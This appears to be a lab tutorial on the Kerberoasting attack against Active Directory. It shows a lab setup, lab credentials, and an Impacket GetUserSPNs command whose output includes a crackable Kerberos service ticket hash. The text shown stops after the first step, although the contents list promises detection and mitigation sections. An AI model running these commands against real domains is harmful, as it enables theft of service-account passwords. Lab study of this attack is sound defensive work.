# kerberosting attack

**Date:** June 2026  
**Author:** ShahinSecLab  
**Category:** Active Directory  
**Difficulty:** Medium 
**Tools:** Meterpreter, Incognito, Windows Access Tokens

# Table of content

- [What is Kerberoasting?](#what-is-kerberoasting)
- [How Kerberoasting Works](#how-kerberoasting-works)
- [Lab Setup](#lab-setup)
- [Attack Process](#attack-process)
  - [Step 1 – Find Service Accounts](#step-1--find-service-accounts)
  - [Step 2 – Request Service Tickets](#step-2--request-service-tickets)
  - [Step 3 – Extract the Ticket](#step-3--extract-the-ticket)
  - [Step 4 – Crack the Ticket Offline](#step-4--crack-the-ticket-offline)
  - [Step 5 – Use the Credentials](#step-5--use-the-credentials)
- [Why Kerberoasting is Dangerous](#why-kerberoasting-is-dangerous)
- [Detection](#detection)
- [Mitigation](#mitigation)
- [Impact](#impact)
- [Key Takeaways](#key-takeaways)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [References](#references)

## What is Kerberoasting?

In Windows networks, services (like SQL Server, IIS, etc.) are registered with something called an SPN (Service Principal Name). When a user wants to access a service, Windows gives them an encrypted service ticket. That ticket is encrypted using the service account's password hash.
Here is the problem — any logged-in domain user can request that ticket, no special permissions needed. An attacker can grab that ticket, take it offline, and crack it to recover the real password.

## How Kerberoasting Works

```
Domain User
     |
     | Requests TGS Ticket
     v
Domain Controller
     |
     | Returns Ticket
     | Encrypted with Service Account Password
     v
Attacker Extracts Ticket
     |
     | Offline Password Cracking
     v
Service Account Password Recovered
```

## Lab Setup

```
| Machine             | Role              |   Ip          |
|---------------------|-------------------|---------------|
| Windows Server 2022 | Domain Controller | 192.168.5.134 |
| Windows 10          | Domain User       | 192.168.5.142 |
| Kali Linux          | Attacker          | 192.168.5.128 |
```

I already have..
Domain: readteambd.local
User: rahimkhan
Pass: Password1

## Attack Process

## 1. Find SPN accounts (Linux – Impacket)

```bash
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
```

`GetUserSPNs.py`
```
Impacket tool used for Kerberoasting
Finds service accounts with SPNs in Active Directory
Requests Kerberos service tickets (TGS)
```


**Output:**

Service Account: `sqlservice`
SPN: `SQLService.READTEAMBD.local`
Domain: `READTEAMBD.local`

```
GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

ServicePrincipalName                            Name        MemberOf                                                         PasswordLastSet      LastLogon 
----------------------------------------------  ----------  ---------------------------------------------------------------  -------------------  ---------
ReadTeamBD-DC/SQLService.READTEAMBD.local:6011  sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=READTEAMBD,DC=local  2025-10-31 06:16:29  <never>   

$krb5tgs$23$*sqlservice$READTEAMBD.LOCAL$ReadTeamBD-DC/SQLService.READTEAMBD.local~6011*$96f871a359f348008f60f60c2ec9c111$0661ac2eeb77cd03dbf48722c056055adcfbabed5deb24f322eb4aa69f431c58866785d6b97c6cc089dfe0075d94427aed215cab8adcdb185c5627658c50ba93e8a3a5dc9a6313b69039a37fcdb7738764525b9bc8a5660b8084b172125fb9429c49cdb7c1d4b2daba77cc3eb951649ac23ca446622016a3fbbbcc6098876d9e487d6ecf611e0bbd19b7fa457aba813b3f85c5fb37868490020dd20543245d809c4baae7cf0ce7d0370348988ae1b1d96be972a5e7453f69a7eb3096cd7413e63cec01d133d1f65976a20837edd732a8b356bb23a469b1f30f01439356e713f67cc1728a37c3a2741630329d5a3573b571d1eb9c668033eb2e2608b942630f61f5620807f4d8dfe78f404bdad3fc36203428e288056d6751c0a367ac3839b56a832efd49fd19238b21b65d0a117aae79b8309f40a430fb41bb0aa4dbca72669a07e51db4ac9a9617ff4a3b91113529c42167509761ffb0736d070f61136506edb74f05edd185a75d54ce103e59b2e6a6b15c046caf015a5f3d9521410b11ce8f35216b1758804f4d10a04305743491a720d6c667440a4bb797d1399baf8381afc0200ab3b4f3ccb6bde5706b8d07c8a23523f00d25316be55a5dd1bc2b1f34df878e8ac0c3d0fdbe6f3cd232c581c7ee613c83e65888cf0d0982d52bb9f23cdcae010eb284aa2f027f36ab041c379c98157ade5d2511bf6c7b3677b9449db75fcfce3747157f2d27daeeecbfbd603a6771190df04c32118d773ad01bf565b056d8e110946d1512c14ce24d9c24d59073018acb3913041c2c94694b3a4259158b66c8fab1a13dab670df5fe79b4c5c04d03d8006324d26b01a43c8497f1c45856a7ea2f6a3a8b12bbe8b08d2aef3c1f5a8626a8d49d87c55765722ba8cc87c55348a57c3ce521d4f7f14b74dd5df8a94a8c2baee0c8a784dcb9283d26d66e3703bcd90eb4d25dc87d6be2d1b66808c3dee12db9852eba1174e0eaf2e91c9b09515fa6cb64ff51b20ed825e449dcc5987362d0ae842f9c7443e38aa4133a9a9cd7d5b03c06384af45f796cce976cc5e09dc9008e4fc549dc403fe2c37fa7580a2019a0b2623c6076a5b1407879e81e19dc404b1603b23c8d1c4d8665bf411b12cd70315dfa63383b0da7d3ce79bc6959d855eb745ed688146b63b48742e3332a307b48f210a862d8b2b6d7ea36eb777aad30001e5cbae00def3e049fef9b229884edbc2d03093a6acf76650a592c170d9dc25100366ec6dfff9e474d205d8e953b1693a21b67b86b2e5efb73c350d9a1b9c5a217be018d9b5b81efcaf61f4738621f2d76475fb77830c849a16e474faf1cf879b790a7976b2af6f4d741322537c33c9eb3e217a61dd8d327016c3d3138168053811f7ee17d03aefe67014446d53ea7bef362b0419f75b69589caf2ea67fc1b4383872a8e5d4de3c4cc25a927bc18d02ccd74ba0ff7586163cd3ff1b95a586af7bad490abe213d14930d7c819e7512f0f6bfc1dc02e0dab5574eb2e50e4984223d7f4e7fbae9eceed
```
